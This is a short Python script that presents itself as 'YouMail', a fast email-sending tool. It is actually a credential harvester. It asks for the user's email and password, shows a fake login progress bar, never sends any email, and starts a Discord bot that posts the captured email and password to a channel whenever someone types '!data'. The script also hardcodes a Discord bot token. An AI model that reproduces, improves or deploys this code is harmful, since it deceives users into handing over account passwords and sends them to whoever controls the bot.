import time
import discord
import os
import tqdm

from tqdm import *

clear = lambda: os.system('cls')
email = None
password = None
msg = None
client = discord.Client()
body = None
title = None
TOKEN = 'OTIyNDI0MjcyMTk3MTQ4NzMy.YcBQjA.pV3vUmbamJSCH2nXrBlses7i6o8'

def frontend():
    clear()
    print('Welcome to YouMail, the fastest email service for every provider.')
    print('With UMail, all you have to do is log in and you can send an email faster than ever before.')
    input('Press enter to continue...')
    clear()

    login()

def login():
    global email
    global password

    print('We are now loggin you in.')
    email = input('Please enter your email: ')
    password = input('Please enter your password: ')
    
    clear()

    for _ in tqdm(range(100),
        desc = 'Logging in',
        ascii = False):
        time.sleep(0.6347)

    send_mail()

def send_mail():
    global body
    global title
    global reciever

    clear()
    time.sleep(0.5)
    reciever = input('Enter the recieving email address: ')
    body = input('Enter the body of your email: ')
    title = input('Enter the title of your email: ')

    clear()
    check_mail()

def check_mail():
    global email
    global body
    global reciever
    global title

    print('From:', email)
    print('To:', reciever)
    print('')
    print(title)
    print(body)
    print('')
    print('')
    print('')
    print('Sending...')
    client.run(TOKEN)

@client.event
async def on_message(message):
    global msg
    global live
    global email
    global password

    msg = (email, password)

    username = str(message.author).split('#')[0]
    user_message = str(message.content)
    channel = str(message.channel.name)
    print(f'{username}: {user_message} ({channel})')

    if live == True:
        if user_message == '!data':
            await message.channel.send(msg)

@client.event
async def on_ready():
    global msg
    global live

    live = True

frontend()
